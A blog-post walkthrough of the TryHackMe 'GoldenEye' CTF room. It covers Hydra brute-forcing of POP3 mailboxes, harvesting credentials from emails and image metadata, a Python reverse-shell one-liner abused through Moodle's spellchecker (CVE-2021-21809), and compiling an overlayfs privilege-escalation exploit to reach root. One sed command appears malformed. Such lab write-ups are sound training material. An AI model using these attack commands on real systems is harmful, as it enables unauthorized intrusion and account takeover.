---
layout: post
title: "GoldenEye"
date: 2022-06-24
categories: [Tryhackme, Medium-THM]
tags: [Hydra, nmap, email, enumeration]
image: ../../assets/img/posts/GoldenEye.png 

---

## Description

Bond, James Bond. A guided CTF.

|**Room**|[GoldenEye](https://tryhackme.com/room/goldeneye)|
|:---:|:---:|
|**OS**|Linux|
|**Difficulty**|Medium|
|**Creator**|[ben](https://tryhackme.com/p/ben)|

---

Starting off with deploying the machine and quickly scanning the open ports with rustscan,

```bash
rustscan -a 10.10.110.114 --ulimit 5000
```

![image](https://user-images.githubusercontent.com/67465230/175462093-9cd29c55-ab5b-498e-a522-f92367434414.png)

We got the open ports and now we can scan them in detail using nmap,

```bash
nmap -sC -sV -p25,80,55006,55007 10.10.110.114 -oN nmap.log
```

![image](https://user-images.githubusercontent.com/67465230/175462120-0cd3a8b9-6a3d-4a8a-a956-d847add089a5.png)

Result scan shows that port 25 is running SMTP service, port 80 is running apache web server, port 55006,55007 is running pop3d service. 

Navigating to http://10.10.110.114 and I landed on the page where I got a message and there is a hidden directory revealed named /sev-home/,

![image](https://user-images.githubusercontent.com/67465230/175462129-e803430e-9ef5-41b4-b08a-a8c98e946fea.png)

After checking the source code, I can see that there is a terminal.js file which seems suspicious to me,

![image](https://user-images.githubusercontent.com/67465230/175462145-5fccef36-89df-4b15-bed3-7cfecbbc533f.png)

we can see that there is a encoded password left for us on the source code of terminal.js file,

![image](https://user-images.githubusercontent.com/67465230/175462297-5e5593be-ef19-4c87-b191-9c82e6916c75.png)

I took this string and paste this in CyberChef, after decoding the string, I got the clear text password,

![image](https://user-images.githubusercontent.com/67465230/175462326-dcd94373-e9dc-4d37-97ec-224982515263.png)

accessing the desired location and dialogue box of login appears. I entered the credentials for the user I found, `Boris:****************`

![image](https://user-images.githubusercontent.com/67465230/175462341-74ffb27e-d13c-492d-90df-3d0fbc3756ca.png)

We get access to the directory and there is a message left for us that we need to mail a qualified GNO supervisor and the email service pop3 is running on a very high unusual non-default port,

![image](https://user-images.githubusercontent.com/67465230/175462367-882c0591-392a-4053-a8e0-8695717c35f9.png)

There are 2 user named **Natalya** and **Boris** who are Qualified GoldenEye Network Operator Supervisors, meaning we can use these 2 users to access the email service,

![image](https://user-images.githubusercontent.com/67465230/175462376-b8c7cf37-cbfe-4a05-8f11-75ede66437f2.png)

I looked up on the google on how to access the pop3 service and got this, [How Email Works](https://computer.howstuffworks.com/e-mail-messaging/email4.htm).

I tried connecting to the port 55007 and provided the username boris and password but it seems out that it is password is incorrect,

```bash
nc 10.10.110.114 55007
USER boris
PASS ****************
```

![image](https://user-images.githubusercontent.com/67465230/194601934-3cdf92fc-1cab-4766-8965-40e6e2643336.png)

Shoot, access denied. I guess I have to contact agent hydra to brute-force Boris’s login credential,

```bash
hydra -l boris -P /usr/share/set/src/fasttrack/wordlist.txt 10.10.147.243 -s 55007 pop3
```

![image](https://user-images.githubusercontent.com/67465230/175462393-b43c9018-288c-4eed-a515-0dbb2c8f6d45.png)

We got the password for the boris user. Let's login using these credentials,

```bash
nc 10.10.147.243 55007
USER boris
PASS ********
```

![image](https://user-images.githubusercontent.com/67465230/194601995-d889fbd7-2154-4ade-86bd-adf9aef294d9.png)

Yay! We got logged into the pop3 service as boris user. Let's list all the messages in the service and we can see that there are 3 emails. So let's retrieve them individually using `RETR` command,

```bash
LIST
RETR 1
RETR 2
RETR 3
```

![image](https://user-images.githubusercontent.com/67465230/175462601-f5576e3c-d9dd-4344-8d8e-067a1f1a0897.png)
![image](https://user-images.githubusercontent.com/67465230/175462609-2bb86d5d-bcd4-4d34-8088-19107cd4d39d.png)

we can see that there are code somewhere placed on the server and using those credentials we can move forward onto next thing but since we don't know where those are, we need to do something else.

We know that there's a natalya user which is a part of Qualified GoldenEye Network Operator Supervisor but we want access her email because we don't have the password. So here, we need to brute force the credentials, 

```bash
hydra -l natalya -P /usr/share/set/src/fasttrack/wordlist.txt 10.10.147.243 -s 55007 pop3
```

![image](https://user-images.githubusercontent.com/67465230/175462617-6e4286ee-8490-48f7-a8a9-e99dc85b65ee.png)

We got the brute forced credentials of natalya user, `natalya:****`. Now, let's try to access the port 55007 and provide the credentials and we got access to email service as natalya user,

```bash
nc 10.10.147.243 55007
USER natalya
PASS ****
```

![image](https://user-images.githubusercontent.com/67465230/194602053-a5841aae-68e0-4cf7-88ae-31f424c5f652.png)

Let's list all the messages in the service and we can see that there are 2 emails. So let's retrieve them individually using `RETR` command,

```bash
LIST
RETR 1
RETR 2
```

![image](https://user-images.githubusercontent.com/67465230/175462650-ede04705-cbc4-4bfb-8671-e7fc21e44483.png)
![image](https://user-images.githubusercontent.com/67465230/175465264-31b76e81-d4dd-4ca5-b4dd-6da4ccf54580.png)

after reading the emails, there are credentials for xenia user lying around, `xenia:***********` and there's a domain name **severnaya-station.com** that we need to add into `/etc/hosts` file.

Let's add the following domain name,

```bash
echo "10.10.147.243    severnaya-station.com" | sudo tee --append /etc/hosts
```

![image](https://user-images.githubusercontent.com/67465230/175462937-ad97cdeb-cb19-4cdc-bfcd-93831735d370.png)

our domain name is added into /etc/hosts file. 

Let's now navigate to the following address, http://severnaya-station.com/gnocertdir/,

![image](https://user-images.githubusercontent.com/67465230/175462973-ebcd5d66-cc67-46eb-a330-1cd04a9902c9.png)

we can login as xenia user in the login panel,

![image](https://user-images.githubusercontent.com/67465230/175462991-e1508337-e560-4d99-bcf9-20089ea5be68.png)

There's a message lying for us that someone named Dr. Doak left a message for us,

![image](https://user-images.githubusercontent.com/67465230/175463017-d6ce3e14-9810-44e7-9f26-a629f3872756.png)

it says, we need to message Dr. Doak via email but since we don't have his credentials to access mail, we can move further.

So let's quickly bruteforce the credentials of Dr. Doak user,

```bash
hydra -l doak -P /usr/share/set/src/fasttrack/wordlist.txt 10.10.147.243 -s 55007 pop3
```

![image](https://user-images.githubusercontent.com/67465230/175463033-45884145-4fb0-4b41-90a9-7a8a56f60aae.png)

We got the credentials so now let's access the email service of dr. doak user, `doak:****`

```bash
nc 10.10.147.243 55007
USER doak
PASS ****
LIST
RETR 1
```

![image](https://user-images.githubusercontent.com/67465230/194602131-857b1739-5727-4d21-b572-682186208b8e.png)
we can see that email contain credentials of dr doak user. 

Let's use these credentials to login into panel as dr_doak user,

![image](https://user-images.githubusercontent.com/67465230/175463862-b371c888-7719-4bdc-851f-6200b42d120e.png)

After logging in, we can see the private file for james named s3cret.txt,

![image](https://user-images.githubusercontent.com/67465230/175463885-f7896ffd-c016-42bd-ae3f-fe0be507e0c3.png)

after downloading the file, I read the content of the file and there I see the image path,

![image](https://user-images.githubusercontent.com/67465230/175463898-d67ed3e1-d72d-4009-971c-4def240e1f00.png)

So I quickly followed up and navigate to this the following path and saw that there is a funky image of a person holding a pistol pointing at us,

![image](https://user-images.githubusercontent.com/67465230/175463925-5533b16e-282a-4f34-981c-37209c21762e.png)

So I quickly downloaded the image using the below command,

```bash
wget http://severnaya-station.com/dir007key/for-007.jpg
```

Now, that our image has been downloaded, we can view the metadata of the tool using `exiftool`,

```bash
exiftool for-007.jpg
```

![image](https://user-images.githubusercontent.com/67465230/175463935-c9f58917-50bc-4b03-92a5-5a3de79f45b1.png)

we can see that image description is encoded as base64.

After decoding this string, we got clear text password,

```bash
echo "eF*****************=" | base64 -d
```

![image](https://user-images.githubusercontent.com/67465230/175463942-82d8e6d2-08d3-4d6e-b3ca-fa00a7d179eb.png)

Now login as Admin and provide the password we got,

![image](https://user-images.githubusercontent.com/67465230/175464013-6f0193b9-2aa8-4360-9fb7-6e20a7f65593.png)

after providing the credentials, we got access to admin panel and we now have full access to panel.

Checking on the google for the software running on the website and I got this vulnerability, [Moodle spellchecker plugin command execution vulnerability](https://talosintelligence.com/vulnerability_reports/TALOS-2021-1277)

> **CVE-2021-21809** : A command execution vulnerability exists in the default legacy spellchecker plugin in Moodle 3.10. A specially crafted series of HTTP requests can lead to command execution. An attacker must have administrator privileges to exploit this vulnerabilities.

![image](https://user-images.githubusercontent.com/67465230/175464324-6a1ff878-983e-49a5-869f-b4bcbe571a7d.png)

we can navigate to system path and we get to know that if we put our one-liner reverse shell on Path to aspell, we can get the reverse shell on the system.

Now start the listener using `nc -nvlp 4444` and put this python one-liner reverse shell in **Path to aspell**,

```python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.9.11.12",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
```

![image](https://user-images.githubusercontent.com/67465230/175464343-849eed28-d26d-4c6e-a7d8-2061806cd64a.png)

after searching for spell, we can change the spell engine to PSpellShell and paste the python one-liner reverse shell.

From there, go to `Navigation > My profile > Blog > Add a new entry` and click on the “Toggle spell checker” icon,

![image](https://user-images.githubusercontent.com/67465230/175464408-18b2d076-df6b-44b1-adbf-c55bc0dbdd81.png)

we got a reverse shell,

![image](https://user-images.githubusercontent.com/67465230/175464626-86ab7d47-45e3-4ea2-ac15-99867c9c28cb.png)

Since we have an unstable shell, let's make this a stable tty shell,

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
Ctrl + Z
stty raw -echo; fg
stty rows 38 columns 116
```

Let's perform a kernel enumeration,

```bash
uname -sr
```

![image](https://user-images.githubusercontent.com/67465230/175464647-d85f6157-d46d-4665-a9d3-7f64dfb47541.png)

This machine is vulnerable to the overlayfs exploit.

The exploitation is technically very simple:

```md
#Create new user and mount namespace using clone with CLONE_NEWUSER|CLONE_NEWNS flags.

#Mount an overlayfs using /bin as lower filesystem, some temporary directories as upper and work directory.

#Overlayfs mount would only be visible within user namespace, so let namespace process change CWD to overlayfs, thus making the overlayfs also visible outside the namespace via the proc filesystem.

#Make su on overlayfs world writable without changing the owner.

#Let process outside user namespace write arbitrary content to the file applying a slightly modified variant of the SetgidDirectoryPrivilegeEscalation exploit.

#Execute the modified su binary
```

We can download the exploit from here, [overlayfs Local Privilege Escalation](https://www.exploit-db.com/exploits/37292). Let's download the exploit from the above link and compile the file to make it executable using gcc compiler,

```bash
gcc 37292.c -o exploit
```

![image](https://user-images.githubusercontent.com/67465230/175464669-653f8c8c-23b1-40ca-b870-124649f92d82.png)

After trying to compile, we get to know that the `gcc` is not installed on system, but `cc` is available: 

```bash
which cc
```

![image](https://user-images.githubusercontent.com/67465230/175464676-759099b5-e545-46b2-b305-f173b191688d.png)

Using `sed` command, we can replace the command `gcc` to `cc` in exploit, 

```bash
sed -i "g/gcc/cc/g" 37292.c
```

![image](https://user-images.githubusercontent.com/67465230/175464691-e28d1cb1-4777-43b1-95f5-94dfe7bdef48.png)

Now, let's compile the source code and we will see that 5 warnings are generated which can be ignored,

```bash
cc 37292.c -o exploit
```

![image](https://user-images.githubusercontent.com/67465230/175464699-d6252d71-b0dc-402e-9501-4ac12e70a64c.png)

Running the exploit and we become root!!

```bash
./exploit
```

![image](https://user-images.githubusercontent.com/67465230/175464716-efdf470a-917a-4356-b085-92c117941b97.png)
